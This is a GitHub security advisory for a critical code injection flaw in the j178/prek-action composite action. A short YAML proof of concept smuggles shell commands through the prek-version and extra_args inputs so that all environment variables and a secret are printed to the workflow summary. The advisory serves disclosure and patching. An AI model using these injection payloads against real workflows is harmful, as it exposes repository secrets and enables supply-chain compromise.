# [C] j178/prek-action vulnerable to arbitrary code injection in composite action

## Summary
Severity: Critical
Advisory: GHSA-pwf7-47c3-mfhx
CWE: CWE-94
Ecosystem: GitHub Actions
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2025-09-29
Source: https://github.com/advisories/GHSA-pwf7-47c3-mfhx
Type: github-advisory

## Affected
- GitHub Actions: `j178/prek-action` — affected >=0 <1.0.6

## Details
### Summary
There are three potential attacks of arbitrary code injection vulnerability in the composite action at _action.yml_.

### Details
The GitHub Action variables `inputs.prek-version`, `inputs.extra_args`, and `inputs.extra-args` can be used to execute arbitrary code in the context of the action.

### PoC
```yaml
- uses: j178/prek-action@v1.0.5
  with:
    prek-version: $(printenv >> $GITHUB_STEP_SUMMARY && echo "0.2.2")
    extra_args: '&& echo "MY_SECRET with a character is: ${MY_SECRET:0:1}a${MY_SECRET:1}" >> $GITHUB_STEP_SUMMARY && echo ""'
  env:
    MY_SECRET: ${{ secrets.MY_SECRET }}
```

The previous example will print all the environment variables, and it will expose `MY_SECRET` environment variable value to the summary of the workflow. An attacker could potentially use this vector to compromise the security of the target repository, even passing unnotice because the action will run normally.

### Impact
Critical, CWE-94

## References
- https://github.com/j178/prek-action/security/advisories/GHSA-pwf7-47c3-mfhx
- https://github.com/j178/prek-action/commit/6b7c6ef5c3875c766893b881b40773cd5605bde3
- https://github.com/j178/prek-action
